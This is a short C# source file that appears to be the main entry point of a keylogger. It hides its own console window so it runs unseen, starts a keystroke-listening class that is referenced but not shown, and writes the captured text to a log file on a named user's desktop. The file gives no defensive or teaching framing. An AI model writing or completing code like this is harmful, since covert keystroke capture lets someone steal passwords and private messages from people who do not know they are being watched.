using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace MyMagicKeyWorks
{
    
    class Program
    {
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        public static string Logger = string.Empty;
        static void Main(string[] args)
        {
            ShowWindow(GetConsoleWindow(), 0);

            using(ApplicationContext app = new ApplicationContext())
            {
                new MyMagicKeyWorks.MagicHereLives.KeyWorks.KeyListner(app);

                Application.Run(app);

                System.IO.File.WriteAllText(@"C:\Users\ISRAEL\Desktop\log.txt", Logger);
            }
        }
    }
}
